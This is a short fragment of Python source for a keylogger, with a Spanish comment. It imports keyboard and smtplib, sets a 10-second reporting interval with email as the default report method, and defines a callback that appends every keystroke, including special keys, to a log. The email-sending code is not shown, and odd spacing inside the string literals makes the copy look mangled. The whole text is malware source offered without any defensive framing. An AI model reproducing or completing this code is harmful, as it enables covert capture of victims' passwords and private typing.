import keyboard
import smtplib
from threading import Timer
from datetime import datetime
SEND_REPORT_EVERY = 10 # 10 segundos de intervalo
class Keylogger :
    def __init__ ( self , interval , report_method = " email " ) :
        self . interval = interval
        self . report_method = report_method
        self . log = " "
        self . start_dt = datetime . now ()
        self . end_dt = datetime . now ()
    def callback ( self , event ) :
        name = event . name
        if len ( name ) > 1:
            if name == " space " :
                name = " "
            elif name == " enter " :
                name = " [ ENTER ]\ n "
            elif name == " decimal " :
                name = " . "
            else :
                name = name . replace ( " " , " _ " )
                name = f " [{ name . upper () }] "
        self . log += name